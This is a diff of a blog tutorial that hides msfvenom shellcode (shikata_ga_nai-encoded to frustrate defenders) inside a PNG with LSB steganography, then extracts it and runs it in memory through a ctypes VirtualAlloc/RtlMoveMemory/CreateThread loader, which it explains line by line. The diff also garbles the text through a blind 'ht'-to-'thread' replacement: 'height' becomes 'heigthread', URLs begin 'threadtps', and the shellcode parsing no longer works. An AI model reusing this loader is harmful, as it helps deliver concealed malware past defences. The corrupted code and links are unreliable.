@@ -14,7 +14,7 @@ Although there are many individual technqiues to conceal data from within other 
 As you will all know, digital images are just a collection of a large number of pixels. The colour of each individual pixels is represented as a combination of different strengths of Red, Green and Blue (RGB) colours. The strength of each of the Red, Green & Blue colours is decided by a number between 0 - 255, with 255 being the strongest. In computers, these numbers are represented as 8-digit binary number.
 
 [![1](/assets/images/PyStegMalz/1.png)](/assets/images/PyStegMalz/1.png){: .full}
-[_PyStegMalz_](https://medium.com/swlh/lsb-image-steganography-using-python-2bbbee2c69a2)
+[_PyStegMalz_](threadtps://medium.com/swlh/lsb-image-steganography-using-python-2bbbee2c69a2)
 
 The above shows the Least Significant Bit is the last bit in the 8-digit long binary number. This is called the LSB because changing it has little impact on the colour of each pixel. For example let's say we have an individual pixel with the following RGB representation. R = 11110110 (246), G = 00110111 (55), B = 10110101 (181). This gives the below colour.
 
@@ -24,7 +24,7 @@ Now let's see the impact on the colour if we change the LSB on each of the colou
 
 [![3](/assets/images/PyStegMalz/3.png)](/assets/images/PyStegMalz/3.png){: .align-center}
 
-We can now see they are practically indistinguishable from each other. LSB stego works by encoding your text in binary, by using the last digit of the each RGB representation for however many pixels is required. This will have a barely noticeable affect on the image, although it will secretly contain a message. An astute reader may have noticed that the length of the binary plaintext encoded using LSB must be <= width (in pixels) * height (in pixels) * 3, otherwise there would simply not enough space to encode it. For this reason, it is good practice to choose an image which has fairly large dimensions.
+We can now see they are practically indistinguishable from each other. LSB stego works by encoding your text in binary, by using the last digit of the each RGB representation for however many pixels is required. This will have a barely noticeable affect on the image, although it will secretly contain a message. An astute reader may have noticed that the length of the binary plaintext encoded using LSB must be <= width (in pixels) * heigthread (in pixels) * 3, otherwise there would simply not enough space to encode it. For this reason, it is good practice to choose an image which has fairly large dimensions.
 
 
 ## Python implementation   
@@ -47,8 +47,8 @@ def encode_lsb(image_path, plaintext_data, output_path):
     # Convert the image to RGB mode (if it's not already)
     image = image.convert("RGB")
 
-    width, height = image.size
-    max_data_length = (width * height) * 3  # 3 channels (RGB) per pixel
+    width, heigthread = image.size
+    max_data_length = (width * heigthread) * 3  # 3 channels (RGB) per pixel
 
     # Convert plaintext to binary format
     binary_data = text_to_binary(plaintext_data)
@@ -66,7 +66,7 @@ def encode_lsb(image_path, plaintext_data, output_path):
     binary_index = 0
 
     # Embed binary data into the image using LSB steganography
-    for y in range(height):
+    for y in range(heigthread):
         for x in range(width):
             pixel = list(image.getpixel((x, y)))
             for channel in range(3):  # 3 channels (RGB)
@@ -87,7 +87,7 @@ def encode_lsb(image_path, plaintext_data, output_path):
 
 * This function takes three parameters: `image_path` (the path to the input image), `plaintext_data` (the plaintext message to be hidden), and `output_path` (the path where the encoded image will be saved).
 
-* The next two lines opens the input image using the [PIL library](https://pypi.org/project/Pillow/) and converts it into RGB mode, to ensure their are 3 channels per pixel.
+* The next two lines opens the input image using the [PIL library](threadtps://pypi.org/project/Pillow/) and converts it into RGB mode, to ensure their are 3 channels per pixel.
 
 * Following this, we use the `text_to_binary()` function to convert our plaintext message, `plaintext_data`, and store it under the `binary_data`. The next line appends the binary `00000000` to our data, this will be used to mark the end of the data in our decoding process.
 
@@ -136,11 +136,11 @@ def decode_lsb(encoded_image_path):
     # Convert the image to RGB mode (if it's not already)
     encoded_image = encoded_image.convert("RGB")
 
-    width, height = encoded_image.size
+    width, heigthread = encoded_image.size
     binary_data = ""
 
     # Extract binary data from the least significant bits of the pixels
-    for y in range(height):
+    for y in range(heigthread):
         for x in range(width):
             pixel = encoded_image.getpixel((x, y))
             for channel in range(3):  # 3 channels (RGB)
@@ -184,13 +184,13 @@ To generate the shellcode I will use msfvenom:
 
 [![6](/assets/images/PyStegMalz/6.png)](/assets/images/PyStegMalz/6.png){: .align-center}
 
-This command uses `-p windows/exec CMD="calc.exe"` to pop calc.exe, with the  `-e x86/shikata_ga_nai -i 5` to use 5 iterations of the `shikata_ga_nai` encoder. Shikata Ga Nai is an polymorphic XOR additive feedback encoder. You don't really know how it works, but you should always encode your shellcode with at least a couple iterations to ensure the blue-team will struggle when attempting to reverse engineer it! If you'd like to learn how the algorithm works and where it's used by many APT groups check [this](https://www.mandiant.com/resources/blog/shikata-ga-nai-encoder-still-going-strong) Mandiant article out!
+This command uses `-p windows/exec CMD="calc.exe"` to pop calc.exe, with the  `-e x86/shikata_ga_nai -i 5` to use 5 iterations of the `shikata_ga_nai` encoder. Shikata Ga Nai is an polymorphic XOR additive feedback encoder. You don't really know how it works, but you should always encode your shellcode with at least a couple iterations to ensure the blue-team will struggle when attempting to reverse engineer it! If you'd like to learn how the algorithm works and where it's used by many APT groups check [this](threadtps://www.mandiant.com/resources/blog/shikata-ga-nai-encoder-still-going-strong) Mandiant article out!
 
 #### Implementing encoding the shellcode.
 
 ##### shellcode.txt
 
-Let's copy the payload straight from msvenom and paste into our `shellcode.txt` file. 
+Let's copy the payload straigthread from msvenom and paste into our `shellcode.txt` file. 
 
 [![5](/assets/images/PyStegMalz/5.png)](/assets/images/PyStegMalz/5.png){: .align-center}
 
@@ -202,7 +202,7 @@ from PIL import Image
 
 
 with open('shellcode.txt', 'r') as shellcode:
-    shellcode_in_text_file = shellcode.read().rstrip().replace('\n','').replace('buf += b', '')
+    shellcode_in_text_file = shellcode.read().rstrip().replace('\n','').replace('buffer += b', '')
     
 
 def text_to_binary(text_data):
@@ -240,35 +240,35 @@ def decode_lsb(encoded_image_path):
         bad_char = plaintext_data[-1:]
         plaintext_data = plaintext_data.replace(bad_char, '"')
     hex_array = plaintext_data.split('"')
-    buf = b''
+    buffer = b''
     for i in hex_array:
         if i != '':
-            buf += '{}'.format(i).encode()
-    return buf
+            buffer += '{}'.format(i).encode()
+    return buffer
 
 def shellcode_exec(shellcode_raw):
 
     shellcode = bytearray(shellcode_raw)
 
-    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+    pointer = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                           ctypes.c_int(len(shellcode)),
                                           ctypes.c_int(0x3000),
                                           ctypes.c_int(0x40))
  
-    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+    buffer = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
  
-    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
-                                     buf,
+    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(pointer),
+                                     buffer,
                                      ctypes.c_int(len(shellcode)))
  
-    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+    thread = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                          ctypes.c_int(0),
-                                         ctypes.c_int(ptr),
+                                         ctypes.c_int(pointer),
                                          ctypes.c_int(0),
                                          ctypes.c_int(0),
                                          ctypes.pointer(ctypes.c_int(0)))
  
-    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
+    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(thread),ctypes.c_int(-1))
 
 encoded_image_path = "poc_example.png"
 shellcode_str = decode_lsb(encoded_image_path)
@@ -295,6 +295,60 @@ If we skip over the `shellcode_exec()` function for now, the final parsing we do
 
 #### Executing
 
-To actually execute the said hex, which was encoded as a string in our image, in python, we'll use the `ctypes` library. `ctypes` allows us to directly interface with Windows API functions. Let's break down the Win32 API functions used to execute the shellcode.
+To actually execute the said hex, which was encoded as a string in our image, in python, we'll use the `ctypes` library. `ctypes` allows us to directly interface with Windows API functions. Let's break down tis function and the Win32 APIs used to execute the shellcode line by line!
 
- 
+1.
+
+```python
+pointer = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                      ctypes.c_int(len(shellcode)),
+                                      ctypes.c_int(0x3000),
+                                      ctypes.c_int(0x40))
+```
+
+`VirtualAlloc` - This is used to allocate an area of memory in the virtual address space. Referencing the [MSDN](threadtps://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) we can see it takes the below parameters:
+
+* lpAddress - The starting memory address of the reserved space. If this is set to `NULL`, like our code has, the system will choose the address
+
+* dwSize - The size of the region to be reserved. In our case this is set to the length of our shellcode, `len(shellcode)`
+
+* flAllocationType - The type of memory allocation. I set this to `0x3000`. This reserves and commits in one operation.
+
+* flProtect - The protection the reserved memory. This is an important one, I've set it to `0x40` which is equivalent to `PAGE_EXECUTE_READWRITE`. This will allow us to actually execute that we shellcode we move into the memory. 
+
+This is saved to the `pointer` variable, which is the memory address of our reserved memory space.  
+
+2.
+
+```python
+buffer = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+```
+
+This line creates a ctypes buffer that contains the shellcode we previously decoded. This will allow us to move this variable into a reserved memory space to be executed.
+
+3. 
+
+```python
+ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(pointer),
+                                 buffer,
+                                 ctypes.c_int(len(shellcode)))
+```
+
+`RtlMoveMemory` - This is used to copy the contents of memory from one area to another. Referencing the [MSDN](https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory) we can see it takes the below parameters:
+
+* Destination - The pointer to the destination address. The place we are going to copy the shellcode too. In our case, this is is our previously defined `pointer` variable.
+
+* Source - The pointer of the memory to be copied. In our case, we can just supply our buffer variable.
+
+* Length - The length, in bytes, of the memory to be copied. In our case this is just `len(shellcode)`
+
+4. 
+
+```python
+thread = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+                                     ctypes.c_int(0),
+                                     ctypes.c_int(pointer),
+                                     ctypes.c_int(0),
+                                     ctypes.c_int(0),
+                                     ctypes.pointer(ctypes.c_int(0)))
+```
